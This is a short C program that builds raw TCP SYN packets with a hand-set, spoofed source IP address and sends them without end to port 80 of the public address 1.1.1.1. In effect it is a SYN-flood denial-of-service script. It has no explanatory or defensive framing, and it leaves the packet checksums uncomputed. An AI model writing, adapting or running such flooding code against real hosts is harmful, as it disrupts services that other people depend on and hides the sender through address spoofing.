#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <threads.h>

int main() {

    int sock;
    char packet[4096];

    struct iphdr *ip = (struct iphdr *) packet;
    struct tcphdr *tcp = (struct tcphdr *) (packet + sizeof(struct iphdr));

    struct sockaddr_in dest;

    // Create raw socket
    sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

    if(sock < 0){
        perror("socket");
        return 1;
    }

    int one = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

    memset(packet, 0, 4096);

    // Destination
    dest.sin_family = AF_INET;
    dest.sin_port = htons(80);
    dest.sin_addr.s_addr = inet_addr("1.1.1.1");

    // -----------------
    // IP HEADER
    // -----------------

    ip->ihl = 5;
    ip->version = 4;
    ip->tos = 0;
    ip->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
    ip->id = htons(54321);
    ip->ttl = 64;
    ip->protocol = IPPROTO_TCP;

    // CUSTOM SOURCE IP
    ip->saddr = inet_addr("192.168.1.29");

    ip->daddr = dest.sin_addr.s_addr;

    // -----------------
    // TCP HEADER
    // -----------------

    tcp->source = htons(80);  // CUSTOM SOURCE PORT
    tcp->dest = htons(80);

    tcp->seq = 0;
    tcp->ack_seq = 0;
    tcp->doff = 5;

    tcp->syn = 1;  // SYN packet
    tcp->window = htons(5840);

    while(1) {
    // Send packet
    sendto(sock, packet,sizeof(struct iphdr) + sizeof(struct tcphdr),0,(struct sockaddr *)&dest,sizeof(dest));
    printf("Packet sent\n");
    }

    close(sock);

    return 0;
}